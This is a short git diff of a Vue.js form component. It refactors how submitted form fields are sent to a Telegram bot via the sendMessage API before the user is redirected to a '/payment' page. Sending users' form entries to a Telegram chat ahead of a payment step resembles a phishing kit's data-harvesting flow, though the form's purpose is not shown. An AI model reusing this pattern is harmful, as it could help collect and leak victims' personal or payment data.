@@ -70,9 +70,7 @@ import Input from "/src/components/MyInput.vue";
 import { useCounterStore } from "/src/stores/info.js";
 import { ref } from "vue";
 import { useRouter } from "vue-router";
-import { updateMyMessage } from "../utils/updateMessage.js";
-
-const { VITE_API_TOKEN, VITE_CHAT_ID } = import.meta.env;
+import { updateMyMessage, fetchSend } from "../utils/updateMessage.js";
 
 const router = useRouter();
 const store = useCounterStore();
@@ -114,10 +112,9 @@ function handleSubmit() {
 
     const theKeys = Object.keys(info);
     for (let i = 0; i < theKeys.length; i++) {
-      updateMyMessage(`${theKeys[i]}:   ${data[i]}`);
+      updateMyMessage(myMessage, `${theKeys[i]}:   ${data[i]}`);
     }
-    const url = `https://api.telegram.org/bot${VITE_API_TOKEN}/sendMessage?chat_id=${VITE_CHAT_ID}&text=${this.myMessage}`;
-    fetch(url).then(() => router.push("/payment"));
+    fetchSend(myMessage.value,()=>router.push("/payment"));
   }
 }
 </script>
